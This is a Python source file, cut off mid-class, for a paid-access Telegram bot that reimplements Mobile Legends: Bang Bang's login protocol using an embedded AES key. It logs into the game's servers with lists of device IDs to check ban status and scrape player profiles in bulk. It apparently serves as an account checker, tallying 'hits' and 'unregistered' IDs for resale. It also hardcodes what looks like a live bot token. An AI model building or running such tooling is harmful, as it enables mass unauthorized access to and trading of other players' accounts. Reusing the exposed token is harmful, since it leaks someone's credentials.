# mlbb_bot.py
from __future__ import annotations
import asyncio
import hashlib
import json
import os
import random
import struct
import sys
import time
import uuid
import zlib
from enum import Enum
from typing import Any, List, Optional, Tuple
from datetime import datetime
import logging
import string
import re
import socket
import concurrent.futures
from concurrent.futures import ThreadPoolExecutor

import zstandard as zstd
from Crypto.Cipher import AES
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, filters, ContextTypes

logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

BOT_TOKEN = "8692114721:AAEzk79ZgoANIFJ7Xlu6gBv9K6YbKap_UyU"
ADMIN_IDS = [8477982865]
KEYS_FILE = "keys.json"
USERS_FILE = "users.json"

LOGIN_HOST = os.environ.get('MLBB_LOGIN_HOST', 'login.ml.youngjoygame.com')
LOGIN_PORT = int(os.environ.get('MLBB_LOGIN_PORT', 30021))
CLI_VER = os.environ.get('MLBB_CLI_VER', '2.1.95.1205.1')
CHANNEL = os.environ.get('MLBB_CHANNEL', 'and_usa')
LANG = os.environ.get('MLBB_LANG', 'en')
CONN_TO = float(os.environ.get('MLBB_CONN_TO', '2.0'))  # Reduced timeout
READ_TO = float(os.environ.get('MLBB_READ_TO', '2.5'))  # Reduced timeout
_AES_KEY = bytes.fromhex('f5a193d50ade553e9835595f5cd75ddd')
_AES_IV = b'\x00' * 16

# ── BAN CHECKER INTEGRATION (OPTIMIZED) ─────────────────────────────
BAN_REASONS = {
    "21": "Using Plug-in Apps to Compromise Competitive Fairness",
    "22": "Using Third-party Software",
    "23": "Abusing Game Mechanics",
    "24": "Toxic Behavior / Verbal Abuse",
    "25": "AFK / Idle in Match",
    "26": "Feed / Intentional Losing",
    "27": "Account Sharing",
    "28": "Inappropriate Name",
    "29": "Suspicious Activity",
}

# Connection pool for reuse
_connection_pool = {}
_pool_lock = asyncio.Lock()

class SdpDataType(Enum):
    INTEGER_POSITIVE = 0
    INTEGER_NEGATIVE = 1
    FLOAT = 2
    DOUBLE = 3
    STRING = 4
    LIST = 5
    DICT = 6
    STRUCT_BEGIN = 7
    STRUCT_END = 8

class SdpException(Exception):
    pass

class SdpStruct(dict):
    __slots__ = ('data', 'offset')
    
    def __init__(self, data=None):
        super().__init__()
        self.data = b''
        self.offset = 0
        if isinstance(data, bytes):
            self.data = data
            self.offset = 0
            self._unpack_from_binary()
        elif data is not None:
            super().update(data)
            self._pack_to_binary()

    def _pack_to_binary(self):
        self.data = bytes([SdpDataType.STRUCT_BEGIN.value << 4])
        for tag, value in sorted(self.items()):
            self._pack(tag, value)
        self.data += bytes([SdpDataType.STRUCT_END.value << 4])

    def _unpack_from_binary(self):
        if not self.data: return
        if self.data[0] >> 4 == SdpDataType.STRUCT_BEGIN.value:
            self.offset = 1
        while self.offset < len(self.data):
            tag, value = self._unpack()
            if isinstance(value, SdpDataType) and value == SdpDataType.STRUCT_END:
                break
            self[tag] = value

    def _write_number(self, value: int) -> bytes:
        result = bytearray()
        while value >= 0x80:
            result.append((value & 0x7F) | 0x80)
            value >>= 7
        result.append(value & 0x7F)
        return bytes(result)

    def _read_number(self) -> int:
        n = 1
        val = self.data[self.offset] & 0x7F
        while self.data[self.offset + n - 1] >= 0x80:
            val |= (self.data[self.offset + n] & 0x7F) << (7 * n)
            n += 1
        self.offset += n
        return val

    def _pack_header(self, tag: int, data_type: SdpDataType) -> None:
        if tag < 15:
            self.data += bytes([(data_type.value << 4) | tag])
        else:
            self.data += bytes([(data_type.value << 4) | 15])
            self.data += self._write_number(tag)

    def _pack(self, tag: int, value: Any) -> None:
        if isinstance(value, bool):
            self._pack_header(tag, SdpDataType.INTEGER_POSITIVE)
            self.data += self._write_number(1 if value else 0)
        elif isinstance(value, int):
            if value < 0:
                self._pack_header(tag, SdpDataType.INTEGER_NEGATIVE)
                self.data += self._write_number(-value)
            else:
                self._pack_header(tag, SdpDataType.INTEGER_POSITIVE)
                self.data += self._write_number(value)
        elif isinstance(value, float):
            self._pack_header(tag, SdpDataType.DOUBLE)
            packed = struct.pack("<d", value)
            self.data += self._write_number(len(packed))
            self.data += packed
        elif isinstance(value, (str, bytes)):
            self._pack_header(tag, SdpDataType.STRING)
            encoded = value.encode('utf-8') if isinstance(value, str) else value
            self.data += self._write_number(len(encoded))
            self.data += encoded
        elif isinstance(value, list):
            self._pack_header(tag, SdpDataType.LIST)
            self.data += self._write_number(len(value))
            for item in value:
                self._pack(0, item)
        elif isinstance(value, dict):
            if isinstance(value, SdpStruct):
                self._pack_header(tag, SdpDataType.STRUCT_BEGIN)
                for k, v in sorted(value.items()):
                    self._pack(k, v)
                self.data += bytes([SdpDataType.STRUCT_END.value << 4])
            else:
                self._pack_header(tag, SdpDataType.DICT)
                self.data += self._write_number(len(value))
                for k, v in sorted(value.items()):
                    self._pack(0, k)
                    self._pack(0, v)
        else:
            raise SdpException(f"Unsupported type: {type(value)}")

    def _unpack(self) -> Tuple[int, Any]:
        try:
            if self.offset >= len(self.data): return 0, None
            header = self.data[self.offset]
            tag = header & 0xF
            data_type = SdpDataType(header >> 4)
            self.offset += 1
            if tag == 15: tag = self._read_number()

            if data_type == SdpDataType.INTEGER_POSITIVE: return tag, self._read_number()
            elif data_type == SdpDataType.INTEGER_NEGATIVE: return tag, -self._read_number()
            elif data_type == SdpDataType.FLOAT:
                val = self._read_number().to_bytes(4, 'little')
                return tag, struct.unpack("<f", val)[0]
            elif data_type == SdpDataType.DOUBLE:
                val = self._read_number().to_bytes(8, 'little')
                return tag, struct.unpack("<d", val)[0]
            elif data_type == SdpDataType.STRING:
                length = self._read_number()
                try: val = self.data[self.offset:self.offset+length].decode('utf-8')
                except UnicodeDecodeError: val = self.data[self.offset:self.offset+length]
                self.offset += length
                return tag, val
            elif data_type == SdpDataType.LIST:
                length = self._read_number()
                val = []
                for _ in range(length):
                    _, item = self._unpack()
                    val.append(item)
                return tag, val
            elif data_type == SdpDataType.DICT:
                length = self._read_number()
                val = {}
                for _ in range(length):
                    _, k = self._unpack()
                    _, v = self._unpack()
                    val[k] = v
                return tag, val
            elif data_type == SdpDataType.STRUCT_BEGIN:
                struct_data = {}
                while True:
                    sub_tag, sub_value = self._unpack()
                    if isinstance(sub_value, SdpDataType) and sub_value == SdpDataType.STRUCT_END:
                        break
                    struct_data[sub_tag] = sub_value
                return tag, SdpStruct(struct_data)
            elif data_type == SdpDataType.STRUCT_END:
                return tag, SdpDataType.STRUCT_END
            else: raise SdpException("Unknown data type")
        except Exception:
            raise SdpException("Unpack error")

class FastBanChecker:
    """Optimized ban checker with connection reuse"""
    
    def __init__(self, device_id: str):
        self.device_id = device_id
        self.sequence = 1
        self.socket = None
        self.queue_data = b''
        
        parts = device_id.split('_')
        device_info = parts[1] if len(parts) >= 2 else device_id
        if len(parts) >= 3 and len(device_info) < 32:
            device_info = device_info + "_" + parts[2]

        if len(device_info) >= 32:
            self.imei_md5 = device_info[:32]
            self.android_id = device_info[32:48] if len(device_info) >= 48 else ""
            self.advertising_id = device_info[48:] if len(device_info) > 48 else ""
        else:
            self.imei_md5 = device_id
            self.android_id = ""
            self.advertising_id = ""

        self.channel = 'and_usa'
        self.client_version = '2.1.61.1205.1'
        self.account_id = 0
        self.session_key = ''
        self.zone_id = 0
        self.game_server_host = ''
        self.game_server_port = 0

    def connect(self, host='login.ml.youngjoygame.com', port=30021):
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.settimeout(3.0)
        self.socket.connect((host, port))
        return self.socket

    def cleanup(self):
        if self.socket:
            try:
                self.socket.close()
            except:
                pass
            self.socket = None
            self.queue_data = b''

    def send_data(self, pkt_id, sdp):
        packet = SdpStruct({0: pkt_id, 1: self.sequence, 5: sdp.data}).data
        buf = zstd.compress(packet)
        flags = (len(buf) + 4) | (16 << 24)
        self.socket.send(flags.to_bytes(4, 'big') + buf)
        self.sequence += 1

    def recv_data(self):
        try:
            while len(self.queue_data) < 4:
                data = self.socket.recv(4096)
                if not data: return None, None
                self.queue_data += data

            flags = int.from_bytes(self.queue_data[:4], 'big')
            size = flags & 0xFFFFFF
            compression_type = flags >> 24

            while len(self.queue_data) < size:
                data = self.socket.recv(4096)
                if not data: return None, None
                self.queue_data += data

            data = self.queue_data[4:size]
            self.queue_data = self.queue_data[size:]

            if compression_type == 1:
                data = zlib.decompress(data)
            elif compression_type == 16:
                data = zstd.decompress(data)
            elif compression_type in (2, 3, 18):
                cipher = AES.new(_AES_KEY, AES.MODE_CBC, iv=_AES_IV)
                data = cipher.decrypt(data[:-1] if len(data) % 16 != 0 else data)
                data = data.rstrip(b'\x00')
                if compression_type == 3: data = zlib.decompress(data)
                elif compression_type == 18: data = zstd.decompress(data)

            result = SdpStruct(data)
            pkt_id = result[0]
            if pkt_id is None: return None, None

            res = result.get(6) or result.get(5)
            if not res or not isinstance(res, bytes):
                return pkt_id, None

            return pkt_id, SdpStruct(res)

        except (socket.timeout, socket.error):
            return -1, None
        except Exception:
            return None, None

def inspect_for_ban(pkt_id, sdp_data):
    is_banned = False
    details = {}

    if sdp_data:
        def scan(obj):
            if isinstance(obj, dict):
                for k, v in obj.items():
                    if k == 'ban_reason':
                        code_str = str(v)
                        details['ban_code'] = code_str
                        details['reason_name'] = BAN_REASONS.get(code_str, "Using Plug-in Apps to Compromise Competitive Fairness")
                    elif k in ('ban_status', 'ban_time') or (isinstance(k, str) and 'ban' in k.lower()):
                        details[str(k)] = v
                    
                    if k == 'endtime_day': details['endtime_day'] = v
                    if k == 'endtime_hour': details['endtime_hour'] = v
                    if k == 'endtime_min': details['endtime_min'] = v
                    if k == 'endtime_sec': details['endtime_sec'] = v

                    if isinstance(v, (dict, list)): scan(v)
            elif isinstance(obj, list):
                for item in obj: scan(item)

        scan(dict(sdp_data))

    if 'endtime_day' in details and details['endtime_day'] is not None:
        is_banned = True

    return is_banned, details

def check_device_ban_silent(device_id: str) -> Tuple[str, dict]:
    """Optimized ban check with shorter timeouts"""
    conn = FastBanChecker(device_id)
    try:
        conn.connect()
        
        # Login request - optimized payload
        conn.send_data(1, SdpStruct({
            0: conn.device_id,
            1: f'gps_adid={conn.advertising_id}&android_id={conn.android_id}&device_unique_id={conn.imei_md5}',
            2: conn.client_version,
            3: conn.channel,
            4: 'en'
        }))

        pkt_id, res = conn.recv_data()
        banned, ban_info = inspect_for_ban(pkt_id, res)
        if banned: 
            return "BANNED", ban_info

        if pkt_id == 2 and res:
            conn.account_id = res.get(0)
            conn.session_key = res.get(1)
            zone_data = res.get(2)
            if isinstance(zone_data, dict): 
                conn.zone_id = zone_data.get(0, 0)
            elif isinstance(zone_data, list) and len(zone_data) > 0:
                conn.zone_id = zone_data[0] if not isinstance(zone_data[0], dict) else zone_data[0].get(0, 0)
            else: 
                conn.zone_id = zone_data or 0
        else:
            return "UNKNOWN", {}

        # Game server request
        conn.send_data(5, SdpStruct({
            0: conn.account_id, 1: conn.session_key, 2: conn.client_version,
            5: conn.zone_id, 6: conn.channel
        }))

        pkt_id, res = conn.recv_data()
        banned, ban_info = inspect_for_ban(pkt_id, res)
        if banned: 
            return "BANNED", ban_info

        if pkt_id == 6 and res:
            game_server = res[1]
            conn.game_server_host, conn.game_server_port = game_server.split(':')
            conn.game_server_port = int(conn.game_server_port)
        else:
            return "UNKNOWN", {}

        conn.cleanup()
        conn.connect(conn.game_server_host, conn.game_server_port)

        # Auth
        conn.send_data(10001, SdpStruct({
            0: conn.account_id, 1: conn.session_key, 2: conn.zone_id,
            4: conn.client_version, 13: conn.channel, 15: conn.device_id
        }))
        conn.send_data(10101, SdpStruct({0: 0, 2: 2}))

        role_requested = False
        for _ in range(5):  # Limit retries
            pkt_id, res = conn.recv_data()
            banned, ban_info = inspect_for_ban(pkt_id, res)
            
            if banned:
                return "BANNED", ban_info

            if pkt_id is None or pkt_id == -1:
                return "UNKNOWN", {}
            elif pkt_id == 10002 and not role_requested:
                conn.send_data(10003, SdpStruct({
                    0: conn.account_id, 1: conn.session_key, 2: conn.zone_id,
                    3: conn.client_version, 4: conn.channel, 5: conn.device_id
                }))
                role_requested = True
            elif pkt_id in (10004, 10008):
                return "CLEAN", {}
                
        return "UNKNOWN", {}
        
    except Exception:
        return "UNKNOWN", {}
    finally:
        conn.cleanup()

def format_ban_info(ban_info: dict) -> str:
    if not ban_info:
        return "No ban information available"
    
    lines = []
    reason = ban_info.get('reason_name', 'Unknown reason')
    lines.append(f"📋 **Ban Reason:** {reason}")
    
    if 'ban_code' in ban_info:
        lines.append(f"🔢 **Ban Code:** {ban_info['ban_code']}")
    
    day = ban_info.get('endtime_day', '?')
    hour = ban_info.get('endtime_hour', '00')
    minute = ban_info.get('endtime_min', '00')
    sec = ban_info.get('endtime_sec', '00')
    lines.append(f"⏱️ **Duration:** Day {day}, {hour}:{minute}:{sec}")
    
    return "\n".join(lines)

# ── END BAN CHECKER INTEGRATION ──────────────────────────────────────

# Rest of the bot code (HERO_ID_MAP, RANK_DEFS, etc.) remains the same...
# [Keep all the existing code from your original mlbb_bot.py here]
# I'll include the full code below for completeness

HERO_ID_MAP = {
    1: "Miya", 2: "Balmond", 3: "Saber", 4: "Alice", 5: "Nana", 6: "Tigreal",
    7: "Alucard", 8: "Karina", 9: "Akai", 10: "Franco", 11: "Bane", 12: "Bruno",
    13: "Clint", 14: "Rafaela", 15: "Eudora", 16: "Zilong", 17: "Fanny", 18: "Layla",
    19: "Minotaur", 20: "Lolita", 21: "Hayabusa", 22: "Freya", 23: "Gord", 24: "Natalia",
    25: "Kagura", 26: "Chou", 27: "Sun", 28: "Alpha", 29: "Ruby", 30: "Yi Sun-shin",
    31: "Moskov", 32: "Johnson", 33: "Cyclops", 34: "Estes", 35: "Hilda", 36: "Aurora",
    37: "Lapu-Lapu", 38: "Vexana", 39: "Roger", 40: "Karrie", 41: "Gatotkaca", 42: "Harley",
    43: "Irithel", 44: "Grock", 45: "Argus", 46: "Odette", 47: "Lancelot", 48: "Diggie",
    49: "Hylos", 50: "Zhask", 51: "Helcurt", 52: "Pharsa", 53: "Lesley", 54: "Jawhead",
    55: "Angela", 56: "Gusion", 57: "Valir", 58: "Martis", 59: "Uranus", 60: "Hanabi",
    61: "Chang'e", 62: "Kaja", 63: "Selena", 64: "Aldous", 65: "Claude", 66: "Vale",
    67: "Leomord", 68: "Lunox", 69: "Hanzo", 70: "Belerick", 71: "Kimmy", 72: "Thamuz",
    73: "Harith", 74: "Minsitthar", 75: "Kadita", 76: "Faramis", 77: "Badang", 78: "Khufra",
    79: "Granger", 80: "Guinevere", 81: "Esmeralda", 82: "Terizla", 83: "X.Borg", 84: "Ling",
    85: "Dyrroth", 86: "Lylia", 87: "Baxia", 88: "Masha", 89: "Wanwan", 90: "Silvanna",
    91: "Cecilion", 92: "Carmilla", 93: "Atlas", 94: "Popol and Kupa", 95: "Yu Zhong",
    96: "Luo Yi", 97: "Benedetta", 98: "Khaleed", 99: "Barats", 100: "Brody", 101: "Yve",
    102: "Mathilda", 103: "Paquito", 104: "Gloo", 105: "Beatrix", 106: "Phoveus",
    107: "Natan", 108: "Aulus", 109: "Aamon", 110: "Valentina", 111: "Edith", 112: "Floryn",
    113: "Yin", 114: "Melissa", 115: "Xavier", 116: "Julian", 117: "Fredrinn", 118: "Joy",
    119: "Novaria", 120: "Arlott", 121: "Ixia", 122: "Nolan", 123: "Cici", 124: "Chip",
    125: "Zhuxin", 126: "Suyou", 127: "Lukas", 128: "Kalea", 129: "Zetian", 130: "Obsidia"
}

RANK_DEFS = [
    (0, 4, "Warrior III"), (5, 9, "Warrior II"), (10, 14, "Warrior I"),
    (15, 19, "Elite IV"), (20, 24, "Elite III"), (25, 29, "Elite II"), (30, 34, "Elite I"),
    (35, 39, "Master IV"), (40, 44, "Master III"), (45, 49, "Master II"), (50, 54, "Master I"),
    (55, 59, "Grandmaster IV"), (60, 64, "Grandmaster III"), (65, 69, "Grandmaster II"),
    (70, 74, "Grandmaster I"), (75, 81, "Epic IV"), (82, 88, "Epic III"),
    (89, 95, "Epic II"), (96, 107, "Epic I"), (108, 114, "Legend IV"),
    (115, 121, "Legend III"), (122, 128, "Legend II"), (129, 135, "Legend I"),
    (136, 160, lambda p: f"Mythic {p - 135}"),
    (161, 195, lambda p: f"Mythical Honor {p - 135}"),
    (196, 235, lambda p: f"Mythical Glory {p - 157}"),
    (236, 999, lambda p: f"Mythical Immortal {p - 157}")
]

COLLECTOR_TIERS = [
    (1000, 4000, "Amateur Collector"), (4000, 10000, "Junior Collector"),
    (10000, 22000, "Seasoned Collector"), (22000, 44000, "Expert Collector"),
    (44000, 84000, "Renowned Collector"), (84000, 160000, "Exalted Collector"),
    (160000, 280000, "Mega Collector"), (280000, float("inf"), "World Collector")
]

AFFINITY_MAP = {0: "None", 1: "Bronze", 2: "Silver", 3: "Gold", 4: "Platinum", 5: "Diamond"}
ROMAN = ["V", "IV", "III", "II", "I"]

# ── FAST BULK BAN CHECKER ─────────────────────────────────────────────
class BulkBanChecker:
    """Optimized bulk ban checker using ThreadPoolExecutor"""
    
    @staticmethod
    def check_batch(device_ids: List[str], max_workers: int = 20) -> dict:
        """Check multiple device IDs in parallel"""
        results = {
            "banned": [],
            "clean": [],
            "unknown": []
        }
        
        def check_single(did):
            status, info = check_device_ban_silent(did)
            return did, status, info
        
        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            futures = [executor.submit(check_single, did) for did in device_ids]
            for future in concurrent.futures.as_completed(futures):
                try:
                    did, status, info = future.result(timeout=10)
                    if status == "BANNED":
                        results["banned"].append((did, info))
                    elif status == "CLEAN":
                        results["clean"].append(did)
                    else:
                        results["unknown"].append(did)
                except Exception:
                    results["unknown"].append(did)
        
        return results

# ── END BULK BAN CHECKER ─────────────────────────────────────────────

def hero_name(hid):
    return HERO_ID_MAP.get(hid, f"Hero({hid})")

def map_rank(points):
    if points is None:
        return "Unknown"
    try:
        points = int(points)
    except Exception:
        return "Unknown"
    for mn, mx, label in RANK_DEFS:
        if mn <= points <= mx:
            return label(points) if callable(label) else label
    return "Unknown"

def collector_tier_str(pts):
    try:
        pts = int(pts)
    except Exception:
        return "No Tier"
    if pts < 1000:
        return "No Tier"
    for lo, hi, name in COLLECTOR_TIERS:
        if lo <= pts < hi:
            if hi == float("inf"):
                return name
            idx = min(4, int((pts - lo) // ((hi - lo) / 5)))
            return f"{name} {ROMAN[idx]}"
    return "Unknown"

def fmt_last_login(ts_val):
    if not ts_val:
        return "Never"
    try:
        t = int(ts_val)
        if t <= 0:
            return "Never"
        diff = max(0, int(time.time()) - t)
        d = diff // 86400
        h = (diff % 86400) // 3600
        m = (diff % 3600) // 60
        if d > 0:
            return f"{d}d {h}h ago"
        if h > 0:
            return f"{h}h {m}m ago"
        return f"{m}m ago"
    except Exception:
        return str(ts_val)

def extract_player_data(result) -> Optional[dict]:
    if not result:
        return None
    try:
        player_list = result.get(0)
        if not player_list:
            return None
        if isinstance(player_list, (dict, SDP)):
            pd = player_list
        elif isinstance(player_list, list):
            if len(player_list) == 0:
                return None
            pd = player_list[0]
        else:
            return None
        if not isinstance(pd, (dict, SDP)):
            return None
        skin = 0
        try:
            skin = int(pd.get(83, 0) or 0)
        except Exception:
            pass
        collector_pts = 0
        t136 = pd.get(136)
        if isinstance(t136, (dict, SDP)):
            try:
                collector_pts = int(t136.get(9, 0) or 0)
            except Exception:
                pass
        aff_lv = 0
        t135 = pd.get(135)
        if isinstance(t135, (dict, SDP)):
            try:
                aff_lv = int(t135.get(1, 0) or 0)
            except Exception:
                pass
        squad_name = str(pd.get(30, "") or "").replace("`", "").strip()
        squad_icon = str(pd.get(31, "") or "")
        squad = f"{squad_icon} {squad_name}".strip() if squad_name else "—"
        t91 = pd.get(91, [])
        last_hero = "N/A"
        prev_heroes = []
        if isinstance(t91, list) and t91:
            try:
                last_hero = hero_name(int(t91[0]))
            except Exception:
                pass
            if len(t91) > 1:
                seen = set()
                for hid in t91[1:]:
                    try:
                        hid = int(hid)
                        if hid not in seen:
                            seen.add(hid)
                            prev_heroes.append(hero_name(hid))
                    except Exception:
                        pass
                    if len(prev_heroes) >= 5:
                        break
        wins = 0
        losses = 0
        try:
            wins = int(pd.get(18, 0) or 0)
        except Exception:
            pass
        try:
            losses = int(pd.get(155, 0) or 0)
        except Exception:
            pass
        total_battles = wins + losses
        win_rate = f"{wins / total_battles * 100:.1f}%" if total_battles > 0 else "N/A"
        nickname = str(pd.get(2, "") or "").strip() or "Unknown"
        level = 0
        try:
            level = int(pd.get(3, 0) or 0)
        except Exception:
            pass
        hero_count = 0
        try:
            hero_count = int(pd.get(4, 0) or 0)
        except Exception:
            pass
        return {
            "nickname": nickname,
            "player_id": pd.get(0, "Unknown"),
            "server_id": pd.get(1, "Unknown"),
            "level": level,
            "skin_count": skin,
            "hero_count": hero_count,
            "last_login": fmt_last_login(pd.get(5, 0)),
            "last_login_country": pd.get(87, "Unknown") or "Unknown",
            "create_country": pd.get(97, "Unknown") or "Unknown",
            "current_rank": map_rank(pd.get(8)),
            "high_rank": map_rank(pd.get(95)),
            "collector_tier": collector_tier_str(collector_pts),
            "squad": squad,
            "affinity": AFFINITY_MAP.get(aff_lv, f"Lv{aff_lv}") if aff_lv else "None",
            "total_battles": total_battles,
            "wins": wins,
            "win_rate": win_rate,
            "last_hero": last_hero,
            "prev_heroes": prev_heroes,
        }
    except Exception as e:
        logger.error(f"extract_player_data error: {e}")
        return None

def format_result_line(res: dict) -> str:
    acc = res['acc']
    zone = res['zone']
    did = res['did']
    player = res.get('player')
    if player:
        prev = ", ".join(player["prev_heroes"]) if player["prev_heroes"] else "N/A"
        line = (
            f"Account: {acc} | Zone: {zone} | "
            f"Name: {player['nickname']} | "
            f"Level: {player['level']} | "
            f"Rank: {player['current_rank']} | "
            f"Highest Rank: {player['high_rank']} | "
            f"Skins: {player['skin_count']} | "
            f"Heroes: {player['hero_count']} | "
            f"Battles: {player['total_battles']} | "
            f"WR: {player['win_rate']} | "
            f"Last Hero: {player['last_hero']} | "
            f"Prev: {prev} | "
            f"Squad: {player['squad']} | "
            f"Collector: {player['collector_tier']} | "
            f"Affinity: {player['affinity']} | "
            f"Last Login: {player['last_login']} | "
            f"Country: {player['last_login_country']} | "
            f"Reg: {player['create_country']} | "
            f"DevID: {did}"
        )
    else:
        line = f"Account: {acc} | Zone: {zone} | DevID: {did}"
    return line

class LiveStats:
    def __init__(self):
        self.lvl_1_30 = 0
        self.lvl_31_50 = 0
        self.lvl_51_99 = 0
        self.lvl_100p = 0
        self.skin_1_50 = 0
        self.skin_51_99 = 0
        self.skin_100_250 = 0
        self.skin_251_300 = 0
        self.skin_301_400 = 0
        self.skin_400p = 0
        self.rank_warrior = 0
        self.rank_elite = 0
        self.rank_master = 0
        self.rank_gm = 0
        self.rank_epic = 0
        self.rank_legend = 0
        self.rank_mythic = 0
        self.total_hits = 0
        self.unreg = 0
        self.with_info = 0
        self.no_info = 0
        self.banned = 0
        self.clean = 0
        self.unknown = 0

    def add_hit(self, res: dict):
        self.total_hits += 1
        player = res.get('player')
        if not player:
            self.no_info += 1
            return
        self.with_info += 1
        level = player.get('level', 0) or 0
        skin = player.get('skin_count', 0) or 0
        rank = player.get('current_rank', '') or ''
        if level <= 30:
            self.lvl_1_30 += 1
        elif level <= 50:
            self.lvl_31_50 += 1
        elif level <= 99:
            self.lvl_51_99 += 1
        else:
            self.lvl_100p += 1
        if skin <= 50:
            self.skin_1_50 += 1
        elif skin <= 99:
            self.skin_51_99 += 1
        elif skin <= 250:
            self.skin_100_250 += 1
        elif skin <= 300:
            self.skin_251_300 += 1
        elif skin <= 400:
            self.skin_301_400 += 1
        else:
            self.skin_400p += 1
        rank_lower = rank.lower()
        if 'warrior' in rank_lower:
            self.rank_warrior += 1
        elif 'elite' in rank_lower:
            self.rank_elite += 1
        elif 'master' in rank_lower:
            self.rank_master += 1
        elif 'grandmaster' in rank_lower:
            self.rank_gm += 1
        elif 'epic' in rank_lower:
            self.rank_epic += 1
        elif 'legend' in rank_lower:
            self.rank_legend += 1
        elif 'mythic' in rank_lower or 'mythical' in rank_lower:
            self.rank_mythic += 1

    def add_unreg(self):
        self.unreg += 1

    def add_ban_result(self, status: str):
        if status == "BANNED":
            self.banned += 1
        elif status == "CLEAN":
            self.clean += 1
        elif status == "UNKNOWN":
            self.unknown += 1

    def format(self) -> str:
        return (
            f"📊 Live Stats\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"📈 Level\n"
            f"  1-30: {self.lvl_1_30:,} | 31-50: {self.lvl_31_50:,}\n"
            f"  51-99: {self.lvl_51_99:,} | 100+: {self.lvl_100p:,}\n\n"
            f"🎨 Skin\n"
            f"  1-50: {self.skin_1_50:,} | 51-99: {self.skin_51_99:,}\n"
            f"  100-250: {self.skin_100_250:,} | 251-300: {self.skin_251_300:,}\n"
            f"  301-400: {self.skin_301_400:,} | 400+: {self.skin_400p:,}\n\n"
            f"🏆 Rank\n"
            f"  Warrior: {self.rank_warrior:,} | Elite: {self.rank_elite:,}\n"
            f"  Master: {self.rank_master:,} | GM: {self.rank_gm:,}\n"
            f"  Epic: {self.rank_epic:,} | Legend: {self.rank_legend:,}\n"
            f"  Mythic+: {self.rank_mythic:,}\n\n"
            f"🚫 Ban Status\n"
            f"  Banned: {self.banned:,} | Clean: {self.clean:,} | Unknown: {self.unknown:,}\n\n"
            f"📦 Hits: {self.total_hits:,} | Info: {self.with_info:,}\n"
            f"🚫 No Info: {self.no_info:,} | Unreg: {self.unreg:,}"
        )

class KeyManager:
    def __init__(self):
        self.keys = self._load(KEYS_FILE)
        self.users = self._load(USERS_FILE)

    def _load(self, path: str) -> dict:
        try:
            if os.path.exists(path):
                with open(path, 'r') as f:
                    return json.load(f)
        except Exception:
            pass
        return {}

    def _save_keys(self):
        try:
            with open(KEYS_FILE, 'w') as f:
                json.dump(self.keys, f, indent=2)
        except Exception as e:
            logger.error(f"Save keys error: {e}")

    def _save_users(self):
        try:
            with open(USERS_FILE, 'w') as f:
                json.dump(self.users, f, indent=2)
        except Exception as e:
            logger.error(f"Save users error: {e}")

    def generate_key(self, duration_seconds: int, label: str, created_by: int) -> str:
        key = "MLBB-" + ''.join(random.choices(string.ascii_uppercase + string.digits, k=16))
        self.keys[key] = {
            "duration": duration_seconds,
            "label": label,
            "created_by": created_by,
            "created_at": time.time(),
            "used_by": None,
            "used_at": None
        }
        self._save_keys()
        return key

    def redeem_key(self, key: str, user_id: int) -> Tuple[bool, str]:
        key = key.strip().upper()
        if key not in self.keys:
            return False, "Invalid key."
        kdata = self.keys[key]
        if kdata["used_by"] is not None:
            return False, "Key already used."
        uid = str(user_id)
        now = time.time()
        kdata["used_by"] = user_id
        kdata["used_at"] = now
        self._save_keys()
        current_expiry = self.users.get(uid, {}).get("expires", 0)
        new_expiry = max(current_expiry, now) + kdata["duration"]
        if uid not in self.users:
            self.users[uid] = {}
        self.users[uid]["expires"] = new_expiry
        self.users[uid]["last_key"] = key
        self._save_users()
        label = kdata["label"]
        expires_dt = datetime.fromtimestamp(new_expiry).strftime("%Y-%m-%d %H:%M:%S")
        return True, f"Access granted!\nPlan: {label}\nExpires: {expires_dt}"

    def has_access(self, user_id: int) -> bool:
        if user_id in ADMIN_IDS:
            return True
        uid = str(user_id)
        if uid not in self.users:
            return False
        return self.users[uid].get("expires", 0) > time.time()

    def get_expiry(self, user_id: int) -> Optional[str]:
        uid = str(user_id)
        if uid not in self.users:
            return None
        exp = self.users[uid].get("expires", 0)
        if exp <= time.time():
            return None
        return datetime.fromtimestamp(exp).strftime("%Y-%m-%d %H:%M:%S")

    def list_keys(self, show_used: bool = False) -> List[dict]:
        result = []
        for k, v in self.keys.items():
            if not show_used and v["used_by"] is not None:
                continue
            result.append({"key": k, **v})
        return result

    def list_users(self) -> List[dict]:
        result = []
        now = time.time()
        for uid, data in self.users.items():
            exp = data.get("expires", 0)
            result.append({
                "uid": uid,
                "expires": datetime.fromtimestamp(exp).strftime("%Y-%m-%d %H:%M:%S") if exp > 0 else "Expired",
                "active": exp > now
            })
        return result

    def revoke_user(self, user_id: int) -> bool:
        uid = str(user_id)
        if uid in self.users:
            self.users[uid]["expires"] = 0
            self._save_users()
            return True
        return False

    def delete_key(self, key: str) -> bool:
        key = key.strip().upper()
        if key in self.keys:
            del self.keys[key]
            self._save_keys()
            return True
        return False

def parse_duration(text: str) -> Tuple[Optional[int], Optional[str]]:
    text = text.strip().lower()
    units = {
        'h': 3600, 'hour': 3600, 'hours': 3600,
        'd': 86400, 'day': 86400, 'days': 86400,
        'w': 604800, 'week': 604800, 'weeks': 604800,
        'm': 2592000, 'month': 2592000, 'months': 2592000,
        'y': 31536000, 'year': 31536000, 'years': 31536000
    }
    match = re.fullmatch(r'(\d+)\s*([a-z]+)', text)
    if not match:
        return None, None
    amount = int(match.group(1))
    unit = match.group(2)
    if unit not in units:
        return None, None
    seconds = amount * units[unit]
    label = f"{amount} {unit}"
    return seconds, label

def _aes(d: bytes) -> bytes:
    c = AES.new(_AES_KEY, AES.MODE_CBC, iv=_AES_IV)
    return c.decrypt(d[:-1] if len(d) % 16 else d)

class _T(Enum):
    IP = 0
    IN = 1
    FL = 2
    DB = 3
    ST = 4
    LI = 5
    DI = 6
    SB = 7
    SE = 8

class SDP(dict):
    def __init__(self, src: Any = None):
        super().__init__()
        self._b = b''
        self._o = 0
        if isinstance(src, bytes):
            self._b = src
            self._unpack()
        elif src is not None:
            super().update(src)
            self._pack()

    def _pack(self):
        self._b = bytes([_T.SB.value << 4])
        for t, v in sorted(self.items()):
            self._pk(t, v)
        self._b += bytes([_T.SE.value << 4])

